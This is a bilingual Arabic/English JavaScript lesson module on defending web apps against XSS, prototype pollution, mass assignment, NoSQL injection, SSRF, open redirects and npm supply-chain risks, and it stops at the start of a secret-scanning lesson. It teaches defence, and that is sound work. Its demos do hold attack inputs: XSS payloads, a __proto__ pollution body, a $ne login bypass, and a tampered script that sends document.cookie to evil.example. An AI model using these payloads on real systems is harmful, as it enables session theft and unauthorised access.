// JavaScript week 43 — Web security in depth.
// Escaping in jsdom; prototype pollution, mass assignment, NoSQL operators, SSRF with net.BlockList, redirects,
// SRI hashes, typosquat checks and a secret scanner run in Node. Library and CI code is shown only.
// Every example defends your own app; none targets a real system.
const B = (ar, en) => ({ ar, en });
const L = (h, p, ex, more) => Object.assign({ h, p, ex }, more || {});
const S = { lang: 'js' };
const T = { lang: 'text' };
const N = (files, more) => Object.assign(files ? { node: 1, files } : { node: 1 }, more || {});
const W = (t, ar, en, ex) => ({ t, m: B(ar, en), ex });
const Q = (q, o, a, why) => ({ q, o: o.map(x => Array.isArray(x) ? B(x[0], x[1]) : x), a, why });
module.exports = {
  level: B('خبير', 'Expert'),
  title: B('أمان الويب بعمق', 'Web security in depth'),
  goal: B('تحمي تطبيقات JavaScript من الثغرات اللي بتعدّي من الأساسيات: XSS بكل سياقاته وCSP بـ nonces، ثغرات خاصة بـ JavaScript (prototype pollution، mass assignment، حقن NoSQL)، SSRF والتحويلات المفتوحة، سلسلة توريد npm، واختبار الأمان في CI ومراجعته.',
          'Protect JavaScript apps from the vulnerabilities that slip past the basics: XSS in all its contexts and CSP with nonces, JavaScript-specific flaws (prototype pollution, mass assignment, NoSQL injection), SSRF and open redirects, the npm supply chain, and security testing and review in CI.'),
  days: [
    { title: B('XSS بكل سياقاته', 'XSS in every context'),
      goal: B('الهروب الصح للمكان الصح.', 'The right escaping for the right place.'),
      learn: [
        L(B('الأنواع والسياقات', 'Kinds and contexts'),
          B('**stored xss** (من القاعدة)، **reflected xss** (من الرابط)، و**dom-based xss** (كود الصفحة نفسه بيحط مدخل في innerHTML). والحل مش «escape» واحد: **context-aware escaping** — جوّه نص HTML، جوّه attribute، جوّه URL، جوّه JavaScript — كل سياق ليه قواعده. وأخطر حاجة: **javascript: url** في href.', '**stored xss** (from the database), **reflected xss** (from the URL), and **dom-based xss** (the page’s own code putting input into innerHTML). The fix is not one «escape»: **context-aware escaping** — inside HTML text, inside an attribute, inside a URL, inside JavaScript — each context has its rules. The most dangerous: a **javascript: url** in an href.'),
          'const escHtml = s => String(s).replace(/[&<>"\']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", \'"\': "&quot;", "\'": "&#39;" }[c]));\nconst safeUrl = s => { try { const u = new URL(s, location.href); return ["https:", "http:", "mailto:", "tel:"].includes(u.protocol) ? u.href : "#"; } catch { return "#"; } };\n\nconst review = { name: \'Mona" onmouseover="steal()\', site: "javascript:steal()", text: "<img src=x onerror=steal()> great shop!" };\nconst card = document.querySelector("#card");\ncard.innerHTML = `<a href="${escHtml(safeUrl(review.site))}" title="${escHtml(review.name)}">${escHtml(review.name)}</a><p>${escHtml(review.text)}</p>`;\nconsole.log("link href:", card.querySelector("a").getAttribute("href"));\nconsole.log("attributes on <a>:", [...card.querySelector("a").attributes].map(a => a.name).join(", "));\nconsole.log("images created:", card.querySelectorAll("img").length, "| text:", card.querySelector("p").textContent);', { run: 'js', html: '<div id="card"></div>' }),
        L(B('HTML غني بأمان', 'Rich HTML safely'),
          B('لو لازم تعرض HTML (وصف منتج من محرر، رد AI بـ Markdown): نضّفه بـ **sanitizer** زي **dompurify** بـ allowlist (عناوين، قوايم، روابط https) — متكتبش regex بنفسك. و**trusted types** في المتصفحات الحديثة بيخلّي `innerHTML` يرفض أي string مش معدّي على policy — بيقفل DOM XSS من جذوره.', 'If you must render HTML (a product description from an editor, an AI reply in Markdown): clean it with a **sanitizer** such as **dompurify** with an allowlist (headings, lists, https links) — never write your own regex. And **trusted types** in modern browsers make `innerHTML` reject any string not passed through a policy — closing DOM XSS at the root.'),
          'import DOMPurify from "dompurify";\nimport { marked } from "marked";\n\nconst clean = DOMPurify.sanitize(marked.parse(aiReplyMarkdown), {\n  ALLOWED_TAGS: ["p", "strong", "em", "ul", "ol", "li", "h3", "a", "code"],\n  ALLOWED_ATTR: ["href"],\n  ALLOWED_URI_REGEXP: /^https:/,\n});\n\n// Trusted Types: with the CSP header  require-trusted-types-for \'script\'\nconst policy = trustedTypes.createPolicy("app", { createHTML: s => DOMPurify.sanitize(s) });\nreplyBox.innerHTML = policy.createHTML(clean);      // a plain string here would throw', S),
        L(B('CSP بـ nonces', 'CSP with nonces'),
          B('CSP قوي: كل `<script>` لازم يبقى معاه **csp nonce** عشوائي جديد لكل طلب، و**strict-dynamic** بيسمح للسكربتات الموثوقة تحمّل غيرها. أي script محقون من غير الـ nonce مش هيشتغل حتى لو XSS حصل. وابدأ بـ `Content-Security-Policy-Report-Only` تشوف إيه اللي هيتكسر.', 'A strong CSP: every `<script>` must carry a random **csp nonce**, new for each request, and **strict-dynamic** lets trusted scripts load others. Any injected script without the nonce will not run even if XSS happens. Start with `Content-Security-Policy-Report-Only` to see what would break.'),
          'import { randomBytes } from "node:crypto";\nimport express from "express";\nconst app = express();\n\napp.use((req, res, next) => {\n  res.locals.nonce = randomBytes(16).toString("base64");\n  res.setHeader("Content-Security-Policy", [\n    `script-src \'nonce-${res.locals.nonce}\' \'strict-dynamic\'`,\n    "object-src \'none\'", "base-uri \'none\'", "frame-ancestors \'none\'",\n    "require-trusted-types-for \'script\'",\n  ].join("; "));\n  next();\n});\napp.get("/", (req, res) => res.send(`<!doctype html><script nonce="${res.locals.nonce}" src="/app.js"></script>`));', S)
      ],
      practice: [
        B('اكتب escape لكل سياق وجرّبه بمدخلات خبيثة.', 'Write escaping for each context and test it with malicious input.'),
        B('دوّر على innerHTML بمدخلات في كودك.', 'Search your code for innerHTML with input.'),
        B('نضّف رد AI بـ DOMPurify.', 'Sanitise an AI reply with DOMPurify.'),
        B('فعّل CSP بـ nonce في Report-Only.', 'Enable a nonce CSP in Report-Only mode.')
      ],
      words: [
        W('stored xss', 'XSS متخزن في القاعدة', 'XSS saved in the database', 'A review field held stored XSS.'),
        W('reflected xss', 'XSS جاي من الرابط', 'XSS bounced back from the request', 'The search page had reflected XSS.'),
        W('dom-based xss', 'XSS من كود الصفحة نفسه', 'XSS created by client-side code', 'innerHTML with location.hash caused DOM-based XSS.'),
        W('context-aware escaping', 'هروب حسب المكان', 'escaping suited to where data goes', 'Attributes need context-aware escaping.'),
        W('javascript: url', 'رابط بيشغّل كود', 'a link that runs script', 'Block javascript: URLs in hrefs.'),
        W('sanitizer', 'منظّف HTML', 'a tool removing dangerous HTML', 'Use a sanitizer for rich text.'),
        W('dompurify', 'مكتبة تنظيف HTML', 'a widely used HTML sanitizer', 'DOMPurify cleans the AI reply.'),
        W('trusted types', 'نظام بيمنع strings خطرة في innerHTML', 'a browser feature blocking unsafe DOM writes', 'Trusted Types made innerHTML throw.'),
        W('csp nonce', 'رقم عشوائي لكل طلب في CSP', 'a per-request random value allowing scripts', 'Only scripts with the CSP nonce run.'),
        W('strict-dynamic', 'سماح للسكربتات الموثوقة تحمّل غيرها', 'a CSP keyword trusting scripts loaded by trusted ones', 'strict-dynamic simplifies the CSP.')
      ],
      read: [{ t: 'OWASP Cheat Sheet: XSS Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html', what: B('اقرا Output Encoding Rules.', 'Read the Output Encoding Rules.') }],
      challenge: B('اعمل «مراجعة XSS» لتطبيق ويب عندك: كل مكان بيعرض بيانات مستخدم أو AI، الهروب حسب السياق، DOMPurify للـ HTML الغني، منع javascript: في الروابط، وCSP بـ nonce وstrict-dynamic (Report-Only أسبوع ثم Enforce).', 'Do an «XSS review» of one of your web apps: every place showing user or AI data, context-aware escaping, DOMPurify for rich HTML, blocking javascript: in links, and a CSP with a nonce and strict-dynamic (Report-Only for a week, then enforced).'),
      quiz: [
        Q(B('href من مستخدم:', 'An href from a user:'), [['اتحقق من البروتوكول (https/mailto/tel)', 'check the protocol (https/mailto/tel)'], ['escape بس', 'escape only'], ['حطه زي ما هو', 'use it as is']], 0, B('javascript:.', 'javascript:.')),
        Q(B('عرض Markdown من AI:', 'Showing Markdown from AI:'), [['parse ثم DOMPurify بـ allowlist', 'parse, then DOMPurify with an allowlist'], ['innerHTML مباشرة', 'innerHTML directly'], ['regex بنفسك', 'your own regex']], 0, B('منظّف.', 'Sanitizer.')),
        Q(B('script محقون من غير nonce:', 'An injected script without the nonce:'), [['مش هيشتغل', 'will not run'], ['هيشتغل عادي', 'runs normally'], ['هيمسح الصفحة', 'wipes the page']], 0, B('CSP.', 'CSP.'))
      ] },

    { title: B('ثغرات خاصة بـ JavaScript', 'JavaScript-specific flaws'),
      goal: B('الثغرات اللي بتطلع من طبيعة اللغة.', 'Flaws born from the language itself.'),
      learn: [
        L(B('Prototype pollution', 'Prototype pollution'),
          B('**prototype pollution**: دمج JSON من مستخدم بدالة merge عميقة ممكن يعدّل `Object.prototype` عبر مفتاح **__proto__** — فتلاقي كل كائن في البرنامج اتغيّر (مثلًا `isAdmin: true` على كل حاجة). الحل: ارفض `__proto__` و`constructor` و`prototype`، استخدم `Object.create(null)` أو `Map`، وخلّي التحقق بـ schema يرفض المفاتيح المجهولة.', '**prototype pollution**: merging user JSON with a deep-merge function can modify `Object.prototype` through a **__proto__** key — and suddenly every object in the program changed (e.g. `isAdmin: true` on everything). The fix: reject `__proto__`, `constructor` and `prototype`, use `Object.create(null)` or a `Map`, and let schema validation refuse unknown keys.'),
          'const naiveMerge = (target, src) => {\n  for (const k in src) {\n    if (typeof src[k] === "object" && src[k] !== null) naiveMerge(target[k] ??= {}, src[k]);\n    else target[k] = src[k];\n  }\n  return target;\n};\nconst BLOCKED = new Set(["__proto__", "constructor", "prototype"]);\nconst safeMerge = (target, src) => {\n  for (const k of Object.keys(src)) {\n    if (BLOCKED.has(k)) continue;\n    if (typeof src[k] === "object" && src[k] !== null) safeMerge(Object.hasOwn(target, k) ? target[k] : (target[k] = {}), src[k]);\n    else target[k] = src[k];\n  }\n  return target;\n};\nconst body = JSON.parse(\'{"theme": "dark", "__proto__": {"isAdmin": true}}\');   // from a «save preferences» request\n\nsafeMerge({}, body);\nconsole.log("after safeMerge, {}.isAdmin =", ({}).isAdmin);\nnaiveMerge({}, body);\nconsole.log("after naiveMerge, {}.isAdmin =", ({}).isAdmin, "← every object in the app is now «admin»");\ndelete Object.prototype.isAdmin;                    // clean up the demo', N()),
        L(B('Mass assignment', 'Mass assignment'),
          B('**mass assignment**: `db.users.update(id, req.body)` — المستخدم يبعت `{"name": "Mona", "role": "admin", "balance": 99999}` ويتحفظوا. الحل: **allowlist fields** — خد الحقول المسموحة بس لكل عملية (بـ zod أو pick)، ومتمررش `req.body` كامل للقاعدة أبدًا.', '**mass assignment**: `db.users.update(id, req.body)` — the user sends `{"name": "Mona", "role": "admin", "balance": 99999}` and it gets saved. The fix: **allowlist fields** — take only the fields allowed for each operation (with zod or a pick), and never pass the whole `req.body` to the database.'),
          'const user = { id: 7, name: "Mona", role: "customer", balance: 0, email: "mona@example.com" };\nconst body = { name: "Mona Ali", role: "admin", balance: 99999, phone: "01012345678" };\n\nconst EDITABLE = { profile: ["name", "phone"], adminPanel: ["name", "phone", "role"] };\nconst pick = (obj, keys) => Object.fromEntries(keys.filter(k => Object.hasOwn(obj, k)).map(k => [k, obj[k]]));\n\nconst unsafe = { ...user, ...body };\nconst safe = { ...user, ...pick(body, EDITABLE.profile) };\nconsole.log("unsafe:", unsafe.role, unsafe.balance);\nconsole.log("safe:  ", safe.role, safe.balance, safe.name, safe.phone);\nconsole.log("ignored fields:", Object.keys(body).filter(k => !EDITABLE.profile.includes(k)));', N()),
        L(B('حقن NoSQL والكود', 'NoSQL and code injection'),
          B('**nosql injection**: في MongoDB، body زي `{"password": {"$ne": ""}}` بيخلي الاستعلام «كلمة السر مش فاضية» = دخول من غير كلمة سر. الحل: اتأكد إن القيم strings/numbers مش objects. و**new function** أو `eval` أو الـ **vm module** مع مدخلات = تنفيذ كود؛ `vm` مش sandbox أمان.', '**nosql injection**: in MongoDB, a body like `{"password": {"$ne": ""}}` makes the query «password is not empty» = login without a password. The fix: make sure values are strings/numbers, not objects. And **new function**, `eval` or the **vm module** with input = code execution; `vm` is not a security sandbox.'),
          'const users = [{ email: "mona@example.com", password: "s3cret-hash" }];\nconst match = (doc, query) => Object.entries(query).every(([k, v]) =>\n  typeof v === "object" && v !== null ? ("$ne" in v ? doc[k] !== v.$ne : false) : doc[k] === v);   // a tiny Mongo-like matcher\n\nconst login = body => users.find(u => match(u, { email: body.email, password: body.password }));\nconst attack = JSON.parse(\'{"email": "mona@example.com", "password": {"$ne": ""}}\');\nconsole.log("naive login with operator:", Boolean(login(attack)));\n\nconst scalar = v => { if (typeof v !== "string" && typeof v !== "number") throw new TypeError("expected a plain value"); return v; };\nconst safeLogin = body => users.find(u => match(u, { email: scalar(body.email), password: scalar(body.password) }));\ntry { safeLogin(attack); } catch (e) { console.log("safe login:", e.message); }', N())
      ],
      practice: [
        B('دوّر على deep merge لبيانات مستخدم في كودك.', 'Look for deep merges of user data in your code.'),
        B('بدّل req.body الكامل بـ pick/zod.', 'Replace whole req.body with pick/zod.'),
        B('اتأكد إن قيم استعلامات Mongo مش objects.', 'Ensure Mongo query values are not objects.'),
        B('دوّر على eval وnew Function وvm.', 'Search for eval, new Function and vm.')
      ],
      words: [
        W('prototype pollution', 'تلويث الـ prototype', 'modifying Object.prototype through input', 'A deep merge allowed prototype pollution.'),
        W('__proto__', 'مفتاح بيوصل للـ prototype', 'the key reaching an object’s prototype', 'Reject __proto__ keys in input.'),
        W('mass assignment', 'تعيين حقول مش مسموحة من الطلب', 'saving unexpected fields from a request', 'Mass assignment made a user an admin.'),
        W('allowlist fields', 'الحقول المسموحة بس', 'only the fields an operation accepts', 'Use allowlist fields for profile updates.'),
        W('nosql injection', 'حقن في قواعد NoSQL', 'injecting operators into NoSQL queries', 'A $ne operator was a NoSQL injection.'),
        W('new function', 'إنشاء دالة من نص', 'creating a function from a string', 'new Function with input is like eval.'),
        W('vm module', 'تشغيل كود في سياق منفصل', 'Node’s module for running code in contexts', 'The vm module is not a security sandbox.')
      ],
      read: [{ t: 'OWASP Cheat Sheet: Prototype Pollution Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html', what: B('اقرا الصفحة كلها.', 'Read the whole page.') }],
      challenge: B('اعمل «مراجعة JavaScript» لـ API عندك: كل merge لبيانات مستخدم، كل update بـ req.body، كل استعلام NoSQL، كل eval/new Function/vm — صلّح كل واحدة واكتب اختبار بمدخل خبيث لكل إصلاح.', 'Do a «JavaScript review» of one of your APIs: every merge of user data, every update with req.body, every NoSQL query, every eval/new Function/vm — fix each one and write a test with a malicious input for every fix.'),
      quiz: [
        Q(B('{"__proto__": {"isAdmin": true}}:', '{"__proto__": {"isAdmin": true}}:'), [['محاولة prototype pollution', 'a prototype-pollution attempt'], ['JSON عادي', 'normal JSON'], ['خطأ في الكتابة', 'a typo']], 0, B('prototype.', 'Prototype.')),
        Q(B('db.update(id, req.body):', 'db.update(id, req.body):'), [['mass assignment', 'mass assignment'], ['آمن', 'safe'], ['أسرع', 'faster']], 0, B('allowlist.', 'Allowlist.')),
        Q(B('password: {"$ne": ""}:', 'password: {"$ne": ""}:'), [['NoSQL injection', 'NoSQL injection'], ['كلمة سر قوية', 'a strong password'], ['CSS', 'CSS']], 0, B('operator.', 'Operator.'))
      ] },

    { title: B('SSRF والتحويلات', 'SSRF and redirects'),
      goal: B('سيرفرك ميتحولش لأداة في إيد حد.', 'Your server never becomes someone else’s tool.'),
      learn: [
        L(B('SSRF بـ BlockList', 'SSRF with BlockList'),
          B('ميزة «استورد من رابط» أو «webhook لأي URL» = SSRF محتمل: المهاجم يدّيك عنوان داخلي (`169.254.169.254`، `localhost:5678`، `10.x`). في Node: `net.BlockList` بيمنع النطاقات الخاصة، وحل الـ DNS بنفسك واتحقق من الـ IP قبل الاتصال — عشان **dns rebinding** (الاسم بيتحل لعنوان عام وبعدين داخلي).', 'An «import from a URL» or «webhook to any URL» feature = potential SSRF: an attacker gives you an internal address (`169.254.169.254`, `localhost:5678`, `10.x`). In Node: `net.BlockList` blocks private ranges, and resolve DNS yourself and check the IP before connecting — because of **dns rebinding** (a name resolving to a public address and then an internal one).'),
          'import { BlockList, isIP } from "node:net";\n\nconst blocked = new BlockList();\nfor (const [net, bits] of [["10.0.0.0", 8], ["172.16.0.0", 12], ["192.168.0.0", 16], ["127.0.0.0", 8], ["169.254.0.0", 16], ["0.0.0.0", 8], ["100.64.0.0", 10]])\n  blocked.addSubnet(net, bits, "ipv4");\nblocked.addSubnet("::1", 128, "ipv6"); blocked.addSubnet("fc00::", 7, "ipv6"); blocked.addSubnet("fe80::", 10, "ipv6");\n\nfunction checkTarget(url, resolvedIp) {          // resolvedIp: from dns.lookup done by YOU, then connect to that IP\n  const u = new URL(url);\n  if (u.protocol !== "https:") return "blocked: https only";\n  if (u.username || u.password) return "blocked: credentials in URL";\n  const family = isIP(resolvedIp) === 6 ? "ipv6" : "ipv4";\n  if (blocked.check(resolvedIp, family)) return `blocked: ${resolvedIp} is internal`;\n  return "ok";\n}\nfor (const [url, ip] of [["https://cdn.shopify.com/a.png", "23.227.38.65"], ["https://169.254.169.254/latest/", "169.254.169.254"],\n                         ["https://images.example.com/x.png", "10.0.0.7"], ["https://ipv6.example.com/", "::1"], ["http://example.com/", "93.184.216.34"]])\n  console.log(url.padEnd(36), checkTarget(url, ip));', N()),
        L(B('التحويلات المفتوحة', 'Open redirects'),
          B('**open redirect**: `/login?next=https://evil.example` — بعد الدخول بتحوّل المستخدم لموقع المهاجم (أو بتسرّب توكن OAuth). الحل: اسمح بمسارات نسبية جوه موقعك بس (`/orders/1042`)، وارفض `//evil.com` و`/\\evil.com` والـ schemes. أو قايمة دومينات مسموحة.', 'An **open redirect**: `/login?next=https://evil.example` — after login you send the user to the attacker’s site (or leak an OAuth token). The fix: allow only relative paths within your site (`/orders/1042`), and reject `//evil.com`, `/\\evil.com` and schemes. Or a list of allowed domains.'),
          'const ORIGIN = "https://shop.example.com";\nfunction safeNext(next) {\n  if (typeof next !== "string" || !next.startsWith("/") || next.startsWith("//") || next.includes("\\\\")) return "/";\n  const u = new URL(next, ORIGIN);\n  return u.origin === ORIGIN ? u.pathname + u.search + u.hash : "/";\n}\nfor (const n of ["/orders/1042?tab=items", "https://evil.example/login", "//evil.example", "/\\\\evil.example", "/%2F%2Fevil.example", "javascript:alert(1)", undefined])\n  console.log(String(n).padEnd(28), "→", safeNext(n));', N()),
        L(B('webhooks واردة', 'Incoming webhooks'),
          B('webhook وارد لازم يتحقق: توقيع HMAC على الـ body الخام، وtimestamp قريب (**timestamp tolerance** 5 دقايق) عشان **webhook replay** (حد يسجّل طلب قديم ويعيده)، وidempotency بالـ event id. والـ body الخام مهم — لو Express عمل parse وبعدين stringify التوقيع هيبوظ.', 'An incoming webhook must be verified: an HMAC signature over the raw body, and a recent timestamp (a **timestamp tolerance** of 5 minutes) against **webhook replay** (someone recording an old request and resending it), plus idempotency by event id. The raw body matters — if Express parses then re-stringifies, the signature breaks.'),
          'import { createHmac, timingSafeEqual } from "node:crypto";\nconst SECRET = "example-webhook-secret";\nconst seen = new Set();\n\nfunction verify({ rawBody, signature, timestamp, eventId }, now = Date.now()) {\n  if (Math.abs(now - Number(timestamp) * 1000) > 5 * 60_000) return "rejected: stale timestamp (replay?)";\n  const expected = createHmac("sha256", SECRET).update(`${timestamp}.${rawBody}`).digest("hex");\n  if (signature.length !== expected.length || !timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) return "rejected: bad signature";\n  if (seen.has(eventId)) return "ignored: duplicate event";\n  seen.add(eventId);\n  return "accepted";\n}\nconst now = 1_760_000_000_000, ts = String(now / 1000), raw = \'{"type":"order.paid","id":1042}\';\nconst sig = createHmac("sha256", SECRET).update(`${ts}.${raw}`).digest("hex");\nconsole.log(verify({ rawBody: raw, signature: sig, timestamp: ts, eventId: "evt_1" }, now));\nconsole.log(verify({ rawBody: raw, signature: sig, timestamp: ts, eventId: "evt_1" }, now));\nconsole.log(verify({ rawBody: raw.replace("1042", "1043"), signature: sig, timestamp: ts, eventId: "evt_2" }, now));\nconsole.log(verify({ rawBody: raw, signature: sig, timestamp: ts, eventId: "evt_3" }, now + 3_600_000));', N())
      ],
      practice: [
        B('حط BlockList قدام أي fetch لرابط من مستخدم.', 'Put a BlockList in front of any fetch of a user URL.'),
        B('صلّح أي redirect بـ next من الرابط.', 'Fix any redirect taking next from the URL.'),
        B('تحقق من webhook بـ timestamp وتوقيع وevent id.', 'Verify a webhook with timestamp, signature and event id.'),
        B('اتأكد إنك بتوقّع على الـ body الخام.', 'Make sure you sign over the raw body.')
      ],
      words: [
        W('ssrf', 'تزوير طلبات من السيرفر', 'server-side request forgery', 'The URL importer allowed SSRF.'),
        W('blocklist', 'قايمة عناوين ممنوعة', 'a list of blocked addresses', 'net.BlockList rejects private ranges.'),
        W('dns rebinding', 'اسم بيتحل لعنوان عام ثم داخلي', 'a name switching to an internal IP', 'Check the resolved IP to stop DNS rebinding.'),
        W('open redirect', 'تحويل لأي موقع من مدخل', 'redirecting to any site from input', 'The next parameter was an open redirect.'),
        W('webhook replay', 'إعادة إرسال webhook قديم', 'resending a recorded webhook', 'A timestamp check stops webhook replay.'),
        W('timestamp tolerance', 'هامش الوقت المقبول', 'the accepted age of a signed request', 'Our timestamp tolerance is five minutes.')
      ],
      read: [{ t: 'OWASP Cheat Sheet: SSRF Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html', what: B('اقرا Application layer.', 'Read the Application layer section.') }],
      challenge: B('أمّن كل نقطة «خارجية» في خدمتك: أي fetch لرابط من مستخدم بـ BlockList وحل DNS يدوي، كل redirect بـ safeNext، وكل webhook وارد بتوقيع على الـ body الخام وtimestamp وidempotency — واختبار لكل حالة خبيثة.', 'Secure every «external» point in your service: any fetch of a user URL with a BlockList and manual DNS resolution, every redirect with safeNext, and every incoming webhook with a raw-body signature, a timestamp and idempotency — with a test for each malicious case.'),
      quiz: [
        Q(B('مستخدم بيدّي 169.254.169.254:', 'A user supplies 169.254.169.254:'), [['SSRF؛ ارفض', 'SSRF; reject it'], ['اجيبه', 'fetch it'], ['XSS', 'XSS']], 0, B('داخلي.', 'Internal.')),
        Q(B('next=//evil.example:', 'next=//evil.example:'), [['open redirect؛ ارجع لـ /', 'an open redirect; go to /'], ['مسار عادي', 'a normal path'], ['آمن', 'safe']], 0, B('//', '//')),
        Q(B('webhook بتوقيع صح بس من ساعة:', 'A correctly signed webhook from an hour ago:'), [['ارفضه: replay محتمل', 'reject it: a possible replay'], ['اقبله', 'accept it'], ['احفظه مرتين', 'save it twice']], 0, B('timestamp.', 'Timestamp.'))
      ] },

    { title: B('سلسلة توريد npm', 'The npm supply chain'),
      goal: B('الحزم متبقاش باب خلفي.', 'Packages that never become a back door.'),
      learn: [
        L(B('مخاطر الحزم', 'Package risks'),
          B('مشروع Node عادي فيه مئات الحزم. المخاطر: **install scripts** (postinstall بيشغّل كود وقت التثبيت)، **typosquatting** (`expres` بدل `express`)، حزمة اتخطفت ونزلت نسخة خبيثة، و**dependency confusion**. الدفاعات: lockfile متراجع في الـ PR، `npm ci`، `--ignore-scripts` في CI لو تقدر، وحزم قليلة.', 'A normal Node project has hundreds of packages. Risks: **install scripts** (postinstall running code at install time), **typosquatting** (`expres` instead of `express`), a hijacked package publishing a malicious version, and **dependency confusion**. Defences: a lockfile reviewed in PRs, `npm ci`, `--ignore-scripts` in CI when possible, and few packages.'),
          'const popular = ["express", "lodash", "axios", "react", "zod", "dotenv", "chalk", "commander", "playwright", "@anthropic-ai/sdk"];\nconst requested = ["expres", "lodahs", "zod", "react-dom", "axois", "dotenv-safe", "comander", "@anthropic-ai/sdk"];\nconst dist = (a, b) => { const d = Array.from({ length: a.length + 1 }, (_, i) => [i, ...Array(b.length).fill(0)]);\n  for (let j = 1; j <= b.length; j++) d[0][j] = j;\n  for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++)\n    d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));\n  return d[a.length][b.length]; };\nfor (const name of requested) {\n  if (popular.includes(name)) { console.log(`ok        ${name}`); continue; }\n  const near = popular.find(p => dist(name, p) <= 2);\n  console.log(near ? `SUSPICIOUS ${name} — did you mean «${near}»?` : `check     ${name} (not in the popular list: review it)`);\n}', N()),
        L(B('Subresource Integrity', 'Subresource Integrity'),
          B('لو بتحمّل script من CDN: **subresource integrity** (`integrity="sha384-…"`) — المتصفح بيحسب الـ hash ويرفض الملف لو اتغيّر (CDN اتخترق). المثال بيحسب قيمة SRI لملف. والأحسن: حط الملفات عندك (self-host) زي الموقع ده.', 'If you load a script from a CDN: **subresource integrity** (`integrity="sha384-…"`) — the browser computes the hash and refuses the file if it changed (a compromised CDN). The example computes an SRI value for a file. Better still: host the files yourself (self-host), like this site does.'),
          'import { createHash } from "node:crypto";\nconst sri = text => "sha384-" + createHash("sha384").update(text).digest("base64");\n\nconst lib = "export const vat = (x, r = 0.14) => Math.round(x * r * 100) / 100;\\n";\nconst tag = `<script type="module" src="https://cdn.example.com/vat@1.2.0.js" integrity="${sri(lib)}" crossorigin="anonymous"></script>`;\nconsole.log(tag);\nconst tampered = lib.replace("0.14", "0.14); fetch(\'https://evil.example/?c=\' + document.cookie");\nconsole.log("tampered file matches?", sri(tampered) === sri(lib), "→ the browser refuses to run it");', N()),
        L(B('السياسة في CI', 'Policy in CI'),
          B('في CI: `npm ci --ignore-scripts` (ولو حزمة محتاجة build، اسمحلها بالاسم)، `npm audit --audit-level=high`، فحص تراخيص، وDependabot/Renovate بـ PRs صغيرة. وقبل أي حزمة جديدة: مين بيصونها، آخر تحديث، التحميلات، وهل فعلًا محتاجها (فيه حاجات بقت جوه Node نفسه: fetch، test runner، sqlite، parseArgs).', 'In CI: `npm ci --ignore-scripts` (allow a package by name if it needs a build), `npm audit --audit-level=high`, licence checks, and Dependabot/Renovate with small PRs. Before any new package: who maintains it, the last update, downloads, and whether you really need it (much is now built into Node: fetch, the test runner, sqlite, parseArgs).'),
          '# .github/workflows/ci.yml (excerpt)\n- run: npm ci --ignore-scripts\n- run: npm rebuild esbuild                     # the one package allowed to run its build step\n- run: npm audit --audit-level=high\n- run: npx license-checker --onlyAllow "MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC"\n\n# .npmrc\nignore-scripts=true\nsave-exact=true\n\nbefore adding a package: maintainer activity · last release · weekly downloads · open issues\n                         · is it already in Node? (fetch, node:test, node:sqlite, util.parseArgs, fs.glob)', T)
      ],
      practice: [
        B('شغّل فاحص الأسماء على package.json بتاعك.', 'Run the name checker on your package.json.'),
        B('احسب SRI لأي script من CDN في موقعك.', 'Compute SRI for any CDN script on your site.'),
        B('جرّب npm ci --ignore-scripts وشوف إيه اللي بيحتاج build.', 'Try npm ci --ignore-scripts and see what needs a build.'),
        B('شيل حزمة بقت موجودة في Node.', 'Remove a package that Node now provides.')
      ],
      words: [
        W('install scripts', 'سكربتات بتشتغل وقت التثبيت', 'code run by packages at install time', 'Install scripts can run anything on CI.'),
        W('typosquatting', 'حزمة باسم شبه المشهورة', 'a malicious package with a look-alike name', '«expres» is typosquatting.'),
        W('dependency confusion', 'تنزيل اسم داخلي من المستودع العام', 'pulling an internal name from the public registry', 'Scoped names prevent dependency confusion.'),
        W('subresource integrity', 'التحقق من hash ملف خارجي', 'verifying a fetched file by its hash', 'Subresource integrity blocked the tampered script.'),
        W('sri', 'اختصار Subresource Integrity', 'subresource integrity', 'Add an SRI hash to the CDN tag.'),
        W('self-host', 'استضافة الملفات عندك', 'serving third-party files yourself', 'We self-host every library.')
      ],
      read: [{ lib: 'npm audit', what: B('اقرا الأوامر والـ audit-level.', 'Read the commands and audit-level.') }],
      challenge: B('اعمل «مراجعة سلسلة توريد» لمشروع JavaScript: فحص أسماء الحزم، حذف 3 حزم ممكن تستبدلها بـ Node، .npmrc بـ ignore-scripts وsave-exact، SRI أو self-host لكل script خارجي، وCI بـ audit وفحص تراخيص.', 'Do a «supply chain review» of a JavaScript project: a package-name check, removing 3 packages replaceable by Node, an .npmrc with ignore-scripts and save-exact, SRI or self-hosting for every external script, and CI with audit and licence checks.'),
      quiz: [
        Q(B('postinstall في حزمة مجهولة:', 'postinstall in an unknown package:'), [['خطر: ignore-scripts', 'risky: use ignore-scripts'], ['عادي', 'normal'], ['أسرع', 'faster']], 0, B('كود.', 'Code.')),
        Q(B('script من CDN:', 'A script from a CDN:'), [['integrity (SRI) أو self-host', 'integrity (SRI) or self-host'], ['src بس', 'src only'], ['eval', 'eval']], 0, B('hash.', 'Hash.')),
        Q(B('حزمة اسمها lodahs:', 'A package named lodahs:'), [['typosquatting محتمل', 'possible typosquatting'], ['نسخة أحدث', 'a newer version'], ['رسمية', 'official']], 0, B('اسم.', 'Name.'))
      ] },

    { title: B('اختبار الأمان ومراجعته', 'Security testing and review'),
      goal: B('الأمان جزء من كل PR.', 'Security as part of every PR.'),
      learn: [
        L(B('مسح الأسرار', 'Secret scanning'),
          B('**secret scanning** = فحص الكود والـ commits عن مفاتيح اتنسيت (gitleaks، GitHub secret scanning). شغّله في pre-commit وCI. ولو سر اتسرب: غيّره فورًا (حذفه من Git مش كفاية — التاريخ فاضل). المثال فاحص صغير بأنماط مبسطة.', '**secret scanning** = checking code and commits for forgotten keys (gitleaks, GitHub secret scanning). Run it in pre-commit and CI. If a secret leaks: rotate it at once (removing it from Git is not enough — history remains). The example is a tiny scanner with simplified patterns.'),
